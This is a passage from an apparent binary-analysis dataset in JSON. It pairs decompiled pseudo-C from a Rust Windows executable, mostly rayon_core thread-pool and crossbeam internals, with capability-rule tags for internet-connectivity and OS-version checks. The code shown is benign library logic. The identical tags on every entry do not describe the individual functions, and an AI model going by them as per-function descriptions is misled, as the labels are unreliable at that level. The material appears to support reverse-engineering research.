sym._T_as_crossbeam_epoch::atomic::Pointable_::init::h4b2bba14c22a45c9(uVar10, piVar22);\n        uStack512 = uVar11;\n        uStack508 = uVar11 >> 0x20;\n        uStack506 = uVar11 >> 0x30;\n        auStack384 = CONCAT412(uVar34, CONCAT48(uVar33, CONCAT44(uVar32, uVar31)));\n        piVar12 = sym.alloc::sync::Arc_T_::new::h1b11b86e4acc484c(&uStack512);\n        LOCK();\n        iVar14 = *piVar12;\n        *piVar12 = *piVar12 + 1;\n        if (*piVar12 == 0 || SCARRY8(iVar14, 1) != *piVar12 < 0) goto code_r0x004119ac;\n        iVar14 = CONCAT26(uStack746, Stack752);\n        if (iVar14 == CONCAT26(uStack754, CONCAT24(uStack756, uStack760))) {\n            sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h33ad435c42ac6d3a(&uStack768, iVar14);\n            iVar14 = CONCAT26(uStack746, Stack752);\n        }\n        iVar13 = CONCAT26(uStack762, CONCAT24(uStack764, uStack768));\n        iVar19 = iVar14 * 0x20;\n        *(iVar13 + iVar19) = piVar12;\n        *(iVar13 + 8 + iVar19) = uVar10;\n        *(iVar13 + 0x10 + iVar19) = piVar22;\n        *(iVar13 + 0x18 + iVar19) = 1;\n        Stack752 = iVar14 + 1;\n        uStack746 = iVar14 + 1 >> 0x30;\n        if (piStack728 == piStack736) {\n            sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h58206779cb33cd4e(&puStack744, piStack728);\n        }\n        puStack744[piStack728 * 2] = piVar12;\n        *(puStack744 + piStack728 * 2 + 1) = 1;\n        piVar22 = piStack728 + 1;\n        piStack728 = piVar22;\n    }\n    Var5 = CONCAT24(uStack764, uStack768);\n    puVar28 = CONCAT26(uStack762, Var5);\n    uStack1112 = CONCAT26(uStack754, CONCAT24(uStack756, uStack760));\n    iVar14 = CONCAT26(uStack746, Stack752);\n    if (piStack728 != NULL) {\n        iVar13 = SUB168(ZEXT816(piStack728) * ZEXT816(0x50), 0);\n        if (SUB168(ZEXT816(piStack728) * ZEXT816(0x50) >> 0x40, 0) != 0) {\n            sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        puVar25 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.185\n                            (iVar13, 8);\n        if (puVar25 == NULL) goto code_r0x00411a77;\n    }\n    uStack1096 = piVar29;\n    piStack1088 = piVar29 & 0xfffffffffffffff;\n    puVar20 = puVar18;\n    puVar26 = puVar25;\n    for (iVar13 = piVar29 << 4; iVar13 != 0; iVar13 = iVar13 + -0x10) {\n        uVar10 = *puVar20;\n        uVar2 = *(puVar20 + 1);\n        puVar20 = puVar20 + 2;\n        uStack506 = 0;\n        uStack504 = 0;\n        uStack500 = SUB164(ZEXT816(0) >> 0x30, 0);\n        Stack496 = 0;\n        uStack490 = 0;\n        uStack762 = 0;\n        uStack760 = 0;\n        uStack756 = 0;\n        uStack754 = 0;\n        Stack752 = 0;\n        *puVar26 = 0;\n        *(puVar26 + 1) = 0;\n        *(puVar26 + 10) = uStack512;\n        *(puVar26 + 0xe) = uStack508;\n        *(puVar26 + 0x12) = 0;\n        *(puVar26 + 0x16) = uStack500;\n        *(puVar26 + 0x1a) = 0;\n        *(puVar26 + 0x22) = uStack768;\n        *(puVar26 + 0x26) = uStack764;\n        *(puVar26 + 0x2a) = 0;\n        *(puVar26 + 0x2e) = 0;\n        puVar26[6] = 0;\n        puVar26[7] = 1;\n        puVar26[8] = uVar10;\n        *(puVar26 + 9) = uVar2 & 1;\n        puVar26 = puVar26 + 10;\n    }\n    uStack1104 = puVar25;\n    if ((piVar12 != NULL) && (auVar4 = ZEXT816(piVar12) * ZEXT816(0x10),  SUB168(auVar4 >> 0x40, 0) == 0)) {\n        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.187\n                  (puVar18, SUB168(auVar4, 0), 8);\n    }\n    if (uStack1032 == 0) {\n        uStack1040 = pe_nt_image_headers64;\n    }\n    else {\n        iVar13 = uStack1032 << 7;\n        uStack1040 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.185\n                               (iVar13, 0x80);\n        if (uStack1040 == NULL) {\ncode_r0x00411a77:\n            dbg.handle_alloc_error(iVar13);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    for (iVar13 = 0; uStack1032 << 7 != iVar13; iVar13 = iVar13 + 0x80) {\n        *(uStack1040 + iVar13) = 0;\n        *(uStack1040 + iVar13 + 8) = 0;\n        *(uStack1040 + iVar13 + 0x10) = 0;\n    }\n    uStack1056 = 3;\n    uStack1016 = 0;\n    uStack1024 = uStack1032;\n    sym._crossbeam_deque::deque::Injector_T__as_core::default::Default_::default::hd082a672e925602a(&uStack768);\n    auStack928 = auStack928 & 0xffffffffffffffff;\n    uStack872 = 0;\n    auStack856[0] = 0;\n    sym.memcpy(auStack400, &uStack768, 0x100);\n    piStack1152 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.184(0x280, 0x80);\n    *piStack1152 = 1;\n    piStack1152[1] = 1;\n    sym.memcpy(piStack1152 + 2, &uStack512, 0x170);\n    piStack1152[0x30] = 3;\n    piStack1152[0x34] = piStack1088;\n    *(piStack1152 + 0x32) = uStack1104;\n    *(piStack1152 + 0x194) = uStack1104._4_4_;\n    *(piStack1152 + 0x33) = uStack1096;\n    *(piStack1152 + 0x19c) = uStack1096._4_4_;\n    *(piStack1152 + 0x39) = uStack1024;\n    *(piStack1152 + 0x1cc) = uStack1024._4_4_;\n    *(piStack1152 + 0x3a) = uStack1016;\n    *(piStack1152 + 0x1d4) = uStack1016._4_4_;\n    *(piStack1152 + 0x37) = uStack1040;\n    *(piStack1152 + 0x1bc) = uStack1040._4_4_;\n    *(piStack1152 + 0x38) = uStack1032;\n    *(piStack1152 + 0x1c4) = uStack1032._4_4_;\n    *(piStack1152 + 0x35) = uStack1056;\n    *(piStack1152 + 0x1ac) = uStack1056._4_4_;\n    *(piStack1152 + 0x36) = uStack1048;\n    *(piStack1152 + 0x1b4) = uStack1044;\n    piStack1152[0x3b] = 0;\n    piStack1152[0x3c] = iStack912;\n    piStack1152[0x3d] = 0;\n    piStack1152[0x3e] = iStack864;\n    piStack1152[0x3f] = 0;\n    piStack1152[0x41] = 1;\n    puStack744 = puVar28 + iVar14 * 4;\n    uStack760 = uStack1112;\n    uStack756 = uStack1112 >> 0x20;\n    uStack754 = uStack1112 >> 0x30;\n    uStack746 = uVar8;\n    piStack736 = NULL;\n    uVar31 = 0;\n    uVar32 = 0;\n    uVar33 = 0;\n    uVar34 = 0;\n    piVar22 = 0x1;\n    uStack768 = uVar35;\n    uStack764 = uVar7;\n    uStack762 = uVar8;\n    Stack752 = Var5;\n    while (piVar12 = piStack736,  uVar35 = in_stack_fffffffffffffb20 >> 0x20,  puVar28 != puStack744) {\n        Stack752 = SUB86(puVar28 + 4, 0);\n        uStack746 = puVar28 + 4 >> 0x30;\n        uVar2 = *(puVar28 + 3);\n        if (uVar2 == 2) break;\n        piStack736 = piStack736 + 1;\n        uStack832 = *puVar28;\n        uStack828 = *(puVar28 + 4);\n        uStack824 = *(puVar28 + 1);\n        uStack820 = *(puVar28 + 0xc);\n        piStack816 = puVar28[2];\n        uStack1144 = *(puVar28 + 0x19) & 0xffffff | *(puVar28 + 0x1c) << 0x18;\n        uStack1140 = uStack1140 & 0xff000000 | *(puVar28 + 0x1c) >> 8;\n        if (iStack904 == 0) {\n            uStack512 = 0;\n            uStack508 = 0;\n            uStack506 = 0;\n        }\n        else {\n            (*ppcStack896[4])(&uStack512, iStack904, piVar12);\n        }\n        piVar29 = piStack880;\n        piVar15 = piStack888;\n        LOCK();\n        iVar14 = *piStack1152;\n        *piStack1152 = *piStack1152 + 1;\n        if (*piStack1152 == 0 || SCARRY8(iVar14, 1) != *piStack1152 < 0) {\ncode_r0x004119ac:\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        piStack960 = piStack1152;\n        uStack1112 = uStack1112 & 0xffffffffffffff00 | uVar2;\n        piVar23 = CONCAT26(uStack506, CONCAT24(uStack508, uStack512));\n        piStack984 = CONCAT44(uStack500, uStack504);\n        piVar16 = CONCAT26(uStack490, Stack496);\n        uStack800 = uStack832;\n        uStack796 = uStack828;\n        uStack792 = uStack824;\n        uStack788 = uStack820;\n        piStack784 = piStack816;\n        piVar24 = CONCAT31(uStack1140, uStack1144._3_1_);\n        uStack1136 = uStack1144;\n        uStack1132 = uStack1132 & 0xff000000 | uStack1140 & 0xffffff;\n        piStack1064 = piVar23;\n        piStack952 = piVar16;\n        if (piVar23 == NULL) {\n            arg2 = NULL;\n            piVar16 = piStack1120;\n        }\n        else {\n            arg2 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(piVar16);\n            piStack1072 = piVar24;\n            sym.memcpy(arg2, piVar23, piVar16);\n            piVar24 = piVar23;\n        }\n        piStack1000 = piStack1064;\n        piStack992 = piStack952;\n        uStack1056 = CONCAT44(uStack796, uStack800);\n        uStack1048 = uStack792;\n        uStack1044 = uStack788;\n        uStack1040 = piStack784;\n        uStack1128 = uStack1136;\n        uStack1124 = uStack1124 & 0xff000000 | uStack1132 & 0xffffff;\n        piStack968 = piVar15;\n        piStack976 = piVar29;\n        piVar23 = piVar29;\n        if (piVar15 == NULL) {\n            piVar23 = piVar22;\n            if (*0x4520b8 == 0) {\n                dbg._var_os(&uStack512, \"RUST_MIN_STACKlibrary\\\\std\\\\src\\\\sys_common\\\\thread_info.rs\", 0xe);\n                piVar22 = CONCAT26(uStack506, CONCAT24(uStack508, uStack512));\n                piVar24 = piVar22;\n                if (piVar22 == NULL) {\ncode_r0x00411553:\n                    piVar29 = 0x200000;\n                }\n                else {\n                    iVar14 = CONCAT44(uStack500, uStack504);\n                    iVar13 = CONCAT26(uStack490, Stack496);\n                    if (iVar13 != 0) {\n                        piVar29 = piVar22 + iVar13;\n                        piVar15 = piVar22;\n                        do {\n                            piVar1 = piVar15 + 1;\n                            uVar2 = *piVar15;\n                            piVar21 = piVar1;\n                            if (uVar2 < '\\0') {\n                                if (uVar2 < 0xe0) {\n                                    piVar21 = piVar15 + 2;\n                                    if (piVar1 == piVar29) {\n                                        piVar21 = piVar1;\n                                    }\n                                }\n                                else if (uVar2 == 0xed) {\n                                    piVar15 = piVar15 + 2;\n                                    if (piVar1 == piVar29) {\n                                        piVar15 = piVar1;\n                                    }\n                                    if (piVar15 == piVar29) break;\n                                    piVar21 = piVar15 + 1;\n                                    if ((piVar1 != piVar29) && (0x9f < *piVar1)) {\n                                        if (iVar14 != 0) {\n                                            piVar24 = 0x1;\n                                            sym.__rust_dealloc(piVar22, 1);\n                                        }\n                                        goto code_r0x00411553;\n                                    }\n                                }\n                                else {\n                                    piVar21 = piVar15 + 2;\n                                    if (piVar1 == piVar29) {\n                                        piVar21 = piVar1;\n                                    }\n                                    piVar21 = (piVar21 != piVar29) + piVar21;\n                                    if (0xef < uVar2) {\n                                        piVar21 = piVar21 + (piVar21 != piVar29);\n                                    }\n                                }\n                            }\n                            piVar15 = piVar21;\n                        } while (piVar21 != piVar29);\n                    }\n                    piStack1120 = piVar22;\n                    dbg.from_str(&uStack512, piVar22, iVar13);\n                    piVar29 = CONCAT44(uStack500, uStack504);\n                    if (iVar14 != 0) {\n                        piVar22 = 0x1;\n                        sym.__rust_dealloc(piStack1120, 1);\n                    }\n                    piVar24 = piVar22;\n                    if (uStack512 != '\\0') goto code_r0x00411553;\n                }\n                *0x4520b8 = piVar29 + 1;\n            }\n            else {\n                piVar29 = *0x4520b8 + -1;\n            }\n        }\n        if (arg2 == NULL) {\n            uVar10 = 0;\n        }\n        else {\n            if (piVar16 < 0x10) {\n                for (piVar24 = NULL; piVar16 != piVar24; piVar24 = piVar24 + 1) {\n                    if (*(arg2 + piVar24) == 0) {\n                        iVar14 = 1;\n                        goto code_r0x0041159f;\n                    }\n                }\n                iVar14 = 0;\n                piVar24 = piVar16;\n            }\n            else {\n                piVar24 = arg2;\n                iVar14 = sym.core::slice::memchr::memchr_general_case::hc11fe596eb571c66(0, arg2, piVar16);\n            }\ncode_r0x0041159f:\n            uStack512 = SUB84(arg2, 0);\n            uStack504 = uStack512;\n            if (iVar14 != 0) {\n                uStack512 = SUB84(piVar24, 0);\n                uStack508 = piVar24 >> 0x20;\n                uStack506 = piVar24 >> 0x30;\n                uStack500 = arg2 >> 0x20;\n                Stack496 = SUB86(piStack1072, 0);\n                uStack490 = piStack1072 >> 0x30;\n                piStack488 = piVar16;\n                dbg.unwrap_failed(\"thread name may not contain interior null bytes\", 0x2f, &uStack512, 0x448840);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            uStack508 = arg2 >> 0x20;\n            uStack506 = arg2 >> 0x30;\n            uStack504 = SUB84(piStack1072, 0);\n            uStack500 = piStack1072 >> 0x20;\n            Stack496 = SUB86(piVar16, 0);\n            uStack490 = piVar16 >> 0x30;\n            uVar10 = dbg._from_vec_unchecked(&uStack512);\n        }\n        piVar22 = sym.std::thread::Thread::new::ha66c84edb9e6189d(uVar10, piVar24);\n        LOCK();\n        iVar14 = *piVar22;\n        *piVar22 = *piVar22 + 1;\n        if (*piVar22 == 0 || SCARRY8(iVar14, 1) != *piVar22 < 0) goto code_r0x004119ac;\n        piStack1120 = piVar16;\n        piStack944 = piVar22;\n        piVar15 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.184(0x30, 8);\n        *piVar15 = 1;\n        piVar15[1] = 1;\n        *(piVar15 + 2) = CONCAT412(uVar34, CONCAT48(uVar33, CONCAT44(uVar32, uVar31)));\n        LOCK();\n        iVar14 = *piVar15;\n        *piVar15 = *piVar15 + 1;\n        if (*piVar15 == 0 || SCARRY8(iVar14, 1) != *piVar15 < 0) goto code_r0x004119ac;\n        piStack936 = piVar15;\n        piVar16 = sym.std::io::stdio::set_output_capture::hbbf000a2b5bc7f34(0);\n        if (piVar16 == NULL) {\n            piVar24 = NULL;\n        }\n        else {\n            LOCK();\n            iVar14 = *piVar16;\n            *piVar16 = *piVar16 + 1;\n            piVar24 = piVar16;\n            if (*piVar16 == 0 || SCARRY8(iVar14, 1) != *piVar16 < 0) goto code_r0x004119ac;\n        }\n        piStack1008 = piVar23;\n        uVar10 = sym.std::io::stdio::set_output_capture::hbbf000a2b5bc7f34(piVar24);\n        uStack512 = uVar10;\n        uStack508 = uVar10 >> 0x20;\n        uStack506 = uVar10 >> 0x30;\n        fcn.00410a56(&uStack512);\n        iVar14 = piVar15[2];\n        if (iVar14 != 0) {\n            LOCK();\n            piVar23 = iVar14 + 0x10;\n            iVar13 = *piVar23;\n            *piVar23 = *piVar23 + 1;\n            if (*piVar23 == 0 || SCARRY8(iVar13, 1) != *piVar23 < 0) {\n                dbg.decrement_num_running_threads(iVar14 + 0x10);\n                uStack512 = 0x449de8;\n                uStack508 = 0;\n                uStack506 = 0;\n                uStack504 = 1;\n                uStack500 = 0;\n                Stack496 = 0;\n                uStack490 = 0;\n                auStack480 = ZEXT816(0x44bbe8);\n                dbg.panic_fmt(&uStack512, 0x449e18);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n        }\n        ppiVar17 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.184(0x70, 8);\n        *ppiVar17 = piVar22;\n        ppiVar17[1] = piVar16;\n        ppiVar17[2] = piStack1000;\n        ppiVar17[3] = piStack984;\n        ppiVar17[4] = piStack992;\n        ppiVar17[5] = piStack968;\n        ppiVar17[6] = piStack976;\n        *(ppiVar17 + 7) = uStack1056;\n        *(ppiVar17 + 0x3c) = uStack1056._4_4_;\n        *(ppiVar17 + 8) = uStack1048;\n        *(ppiVar17 + 0x44) = uStack1044;\n        ppiVar17[9] = uStack1040;\n        *(ppiVar17 + 10) = uStack1112;\n        *(ppiVar17 + 0x51) = uStack1128;\n        *(ppiVar17 + 0x54) = CONCAT31(uStack1124, uStack1128._3_1_);\n        ppiVar17[0xb] = piStack960;\n        ppiVar17[0xc] = piVar12;\n        ppiVar17[0xd] = piVar15;\n        uStack512 = SUB84(ppiVar17, 0);\n        uStack508 = ppiVar17 >> 0x20;\n        uStack506 = ppiVar17 >> 0x30;\n        uStack504 = 0x448798;\n        uStack500 = 0;\n        puVar25 = sym.__rust_alloc(0x10, 8);\n        if (puVar25 == NULL) {\n            dbg.handle_alloc_error(0x10);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        *puVar25 = ppiVar17;\n        puVar25[1] = 0x448798;\n        in_stack_fffffffffffffb20 = CONCAT44(uVar35, 0x10000);\n        puVar18 = sub.KERNEL32.dll_CreateThread(0, piVar29, dbg.thread_start, puVar25, in_stack_fffffffffffffb20, 0);\n        if (puVar18 == NULL) {\n            uVar10 = *puVar25;\n            ppcVar3 = puVar25[1];\n            (**ppcVar3)(uVar10);\n            if (ppcVar3[1] != NULL) {\n                sym.__rust_dealloc(uVar10, ppcVar3[2]);\n            }\n            sym.__rust_dealloc(puVar25, 8);\n            uVar9 = sub.KERNEL32.dll_GetLastError();\n            sym.core::ptr::drop_in_place_alloc::sync::Arc_std::thread::Packet______::h95e73edf9046b5dc(&piStack936);\n            sym.core::ptr::drop_in_place_std::thread::Thread_::hc3b35c2f6cb5f293(&piStack944);\n            sym._alloc::vec::into_iter::IntoIter_T_A__as_core::ops::drop::Drop_::drop::h9d5c3ff09026b48d(&uStack768);\n            LOCK();\n            piVar22 = piStack1152 + 0x41;\n            *piVar22 = *piVar22 + -1;\n            if (*piVar22 == 0) {\n                uVar27 = piStack1152[0x34];\n                piVar12 = piStack1152 + 0x35;\n                piVar22 = piStack1152[0x32] + 0x38;\n                for (arg2_00 = 0; (uVar27 & 0xfffffffffffffff) != arg2_00; arg2_00 = arg2_00 + 1) {\n                    LOCK();\n                    *piVar22 = *piVar22 + -1;\n                    if (*piVar22 == 0) {\n                        piVar22[-1] = 3;\n                        sym.rayon_core::sleep::Sleep::wake_specific_thread::h550424ba75ba2220(piVar12, arg2_00);\n                    }\n                    piVar22 = piVar22 + 10;\n                }\n            }\n            sym.core::ptr::drop_in_place_alloc::sync::Arc_rayon_core::registry::Registry__::h7db2201568d2142d\n                      (&piStack1152);\n            bVar30 = false;\n            piVar22 = uVar9 << 0x20 | 2;\n            goto code_r0x004118e1;\n        }\n        uStack1104 = puVar18;\n        uStack1096 = piVar22;\n        piStack1088 = piVar15;\n        sub.KERNEL32.dll_CloseHandle(puVar18);\n        sym.core::ptr::drop_in_place_std::thread::Thread_::hc3b35c2f6cb5f293(&uStack1096);\n        sym.core::ptr::drop_in_place_alloc::sync::Arc_std::thread::Packet______::h95e73edf9046b5dc(&piStack1088);\n        piVar22 = piStack1008;\n        puVar28 = CONCAT26(uStack746, Stack752);\n    }\n    sym._alloc::vec::into_iter::IntoIter_T_A__as_core::ops::drop::Drop_::drop::h9d5c3ff09026b48d(&uStack768);\n    bVar30 = true;\n    piVar22 = piStack1152;\ncode_r0x004118e1:\n    sym._ZN4core3ptr274drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_dyn_u20_core..ops..function..Fn_LT__LP_alloc..box\n              (auStack928 + 8);\n    iVar14 = iStack904;\n    if (iStack904 != 0) {\n        (**ppcStack896)(iStack904);\n        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.187\n                  (iVar14, ppcStack896[1], ppcStack896[2]);\n    }\n    sym._ZN4core3ptr209drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_dyn_u20_core..ops..function..Fn_LT__LP_usize_C__R\n              (&uStack872);\n    sym._ZN4core3ptr209drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_dyn_u20_core..ops..function..Fn_LT__LP_usize_C__R\n              (auStack856);\n    piVar12 = piStack1080;\n    if (bVar30) {\n        uStack512 = SUB84(piVar22, 0);\n        uStack508 = piVar22 >> 0x20;\n        uStack506 = piVar22 >> 0x30;\n        if (*0x452030 != NULL) {\n            sym.core::ptr::drop_in_place_alloc::sync::Arc_rayon_core::registry::Registry__::h7db2201568d2142d\n                      (&uStack512);\n            piVar22 = *0x452030;\n        }\n        *0x452030 = piVar22;\n        piVar22 = 0x452030;\n        iVar14 = 0;\n    }\n    else {\n        iVar14 = 1;\n    }\n    if (*piVar12 != 0) {\n        sym.core::ptr::drop_in_place_rayon_core::ThreadPoolBuildError_::hc2863c99eb1b2e48(piVar12 + 1);\n    }\n    *piVar12 = iVar14;\n    piVar12[1] = piVar22;\n    return;\n}\n",
        "token_count": 9074
    },
    "6f369485": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t sym._rayon_core::ThreadPoolBuildError_as_core::fmt::Debug_::fmt::h6f369485146e8c69(ulong arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    ulong uVar4;\n    ulong uVar5;\n    ulong uVar6;\n    ulong uStack48;\n    int64_t iStack40;\n    uint8_t uStack32;\n    char cStack31;\n    int64_t iVar3;\n    \n    // <rayon_core::ThreadPoolBuildError as core::fmt::Debug>::fmt::h6f369485146e8c69\n    uStack48 = arg1;\n    uStack32 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), 0x448b52, 0x14);\n    cStack31 = '\\0';\n    iStack40 = arg2;\n    uVar1 = dbg.field(&iStack40, 0x44a362, 4, &uStack48);\n    uVar2 = uVar1 & 0xffffffffffffff00 | uStack32;\n    if ((cStack31 != '\\0') && (uVar2 = CONCAT71((uVar1 & 0xffffffffffffff00) >> 8, 1),  uStack32 == 0)) {\n        if ((*(iStack40 + 0x30) & 4) == 0) {\n            uVar4 = *(iStack40 + 0x20);\n            iVar3 = *(iStack40 + 0x28);\n            uVar5 = 0x4490ff;\n            uVar6 = 2;\n        }\n        else {\n            uVar4 = *(iStack40 + 0x20);\n            iVar3 = *(iStack40 + 0x28);\n            uVar5 = 0x448ee2;\n            uVar6 = 1;\n        }\n        uVar2 = (**(iVar3 + 0x18))(uVar4, uVar5, uVar6);\n    }\n    return uVar2;\n}\n",
        "token_count": 465
    },
    "9262a30a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym._T_as_core::fmt::Debug_::fmt::h9262a30a14043452(int64_t **arg1, int64_t arg2)\n\n{\n    int64_t *piStack8;\n    \n    // <&T as core::fmt::Debug>::fmt::h9262a30a14043452\n    piStack8 = *arg1;\n    if (*piStack8 != 0) {\n        sym.core::fmt::Formatter::debug_tuple_field1_finish::haca11a36ffb48117(arg2, \"IOError\", 7, &piStack8);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00411bc3. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"GlobalPoolAlreadyInitialized\", 0x1c);\n    return;\n}\n",
        "token_count": 210
    },
    "fcd59c6d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.rayon_core::latch::LockLatch::wait_and_reset::hfcd59c6d67e32b68(int64_t arg1)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    unkbyte7 in_R9;\n    int64_t iStack48;\n    char cStack40;\n    \n    // rayon_core::latch::LockLatch::wait_and_reset::hfcd59c6d67e32b68\n    sym.std::sync::mutex::Mutex_T_::lock::h62098323f0fb8253(&iStack48, arg1);\n    uVar2 = 0x4488d0;\n    iStack48 = sym.core::result::Result_T_E_::unwrap::h275888c52c276ebd(&iStack48, 0x4488d0);\n    while (cStack40 = uVar2,  *(iStack48 + 9) == '\\0') {\n        sym.std::sync::condvar::Condvar::wait::h04043a752ec3db26\n                  (&iStack48, arg1 + 0x10, iStack48, CONCAT71(in_R9, cStack40 != '\\0'));\n        uVar1 = 0;\n        iStack48 = sym.core::result::Result_T_E_::unwrap::h275888c52c276ebd(&iStack48, 0x4488e8);\n        uVar2 = uVar1 & 1;\n    }\n    *(iStack48 + 9) = 0;\n    sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::h1d527a45e74a1c46(&iStack48);\n    return;\n}\n",
        "token_count": 381
    },
    "f27dcebe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t sym.rayon_core::registry::global_registry::hf27dcebee1561694(void)\n\n{\n    int64_t iStack32;\n    int64_t iStack24;\n    int64_t *piStack16;\n    int64_t **ppiStack8;\n    \n    // rayon_core::registry::global_registry::hf27dcebee1561694\n    iStack24 = 0;\n    iStack32 = 1;\n    if (*0x452038 != 3) {\n        piStack16 = &iStack32;\n        ppiStack8 = &piStack16;\n        dbg.call_inner(0x452038, 0, &ppiStack8, 0x4486b8);\n    }\n    if (iStack32 != 0) {\n        iStack32 = iStack24;\n        if (*0x452030 == 0) {\n            dbg.unwrap_failed(str.The_global_thread_pool_has_not_been_initialized.f, 0x30, &iStack32, 0x448800);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        sym.core::ptr::drop_in_place_rayon_core::ThreadPoolBuildError_::hc2863c99eb1b2e48(&iStack32);\n        iStack24 = 0x452030;\n    }\n    return iStack24;\n}\n",
        "token_count": 294
    },
    "dc80ea30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.rayon_core::registry::Registry::inject::hdc80ea30f1a1616c(uint64_t *arg1, uint64_t *arg2)\n\n{\n    uint64_t *puVar1;\n    char cVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint64_t *puVar9;\n    bool bVar10;\n    uint32_t uStack1644;\n    uint64_t uStack1640;\n    uint64_t *puStack1632;\n    uint64_t uStack1624;\n    uint64_t uStack1616;\n    uint64_t uStack1608;\n    uint64_t uStack1600;\n    uint64_t *puStack1592;\n    uchar auStack1584 [1504];\n    ulong uStack80;\n    \n    // rayon_core::registry::Registry::inject::hdc80ea30f1a1616c\n    uStack1600 = *arg1;\n    uStack1608 = arg1[0x10];\n    puStack1592 = arg2 + 2;\n    while (puStack1592 != arg2) {\n        uStack1624 = *arg2;\n        uStack1616 = arg2[1];\n        uStack1644 = 0;\n        puVar9 = arg1[0x11];\n        uStack1640 = 0;\n        uVar4 = arg1[0x10];\n        puStack1632 = arg2;\n        while( true ) {\n            while( true ) {\n                uVar6 = (uVar4 & 0xffffffff) >> 1 & 0x3f;\n                uVar5 = uVar6;\n                if (uVar6 != 0x3f) break;\n                sym._ZN15crossbeam_utils7backoff7Backoff6snooze17he19e96ba0c9f83d6E.197(&uStack1644);\n                puVar9 = arg1[0x11];\n                uVar4 = arg1[0x10];\n            }\n            if ((uVar6 == 0x3e) && (uStack1640 == 0)) {\n                sym.crossbeam_deque::deque::Block_T_::new::ha870a499814eac98(auStack1584);\n                uVar3 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.184(0x5f0, 8);\n                sym.memcpy(uVar3, auStack1584, 0x5f0);\n                sym._ZN4core3ptr134drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_crossbeam_deque..deque..Block_LT_rayon_core..job.\n                          (&uStack1640);\n                uStack1640 = uVar3;\n            }\n            LOCK();\n            puVar1 = arg1 + 0x10;\n            bVar10 = uVar4 == *puVar1;\n            *puVar1 = *puVar1 ^ bVar10 * (*puVar1 ^ uVar4 + 2);\n            uVar3 = uVar4 ^ !bVar10 * (uVar4 ^ *puVar1);\n            if (bVar10) break;\n            puVar9 = arg1[0x11];\n            uVar6 = 6;\n            if (uStack1644 < 6) {\n                uVar6 = uStack1644;\n            }\n            for (uVar7 = 0; uVar7 >> (uVar6 & 0x1f) == 0; uVar7 = uVar7 + 1) {\n            }\n            uVar4 = uVar3;\n            if (uStack1644 < 7) {\n                uStack1644 = uStack1644 + 1;\n            }\n        }\n        arg2 = puStack1632 + 2;\n        puStack1632 = arg2;\n        if (uVar6 == 0x3e) {\n            if (uStack1640 == 0) {\n                dbg.panic(0x44bcbb, 0x2b, 0x448510);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            arg1[0x11] = uStack1640;\n            arg1[0x10] = uVar4 + 4;\n            *puVar9 = uStack1640;\n            puVar9[0xbb] = uStack1624;\n            puVar9[0xbc] = uStack1616;\n            LOCK();\n            puVar9[0xbd] = puVar9[0xbd] | 1;\n        }\n        else {\n            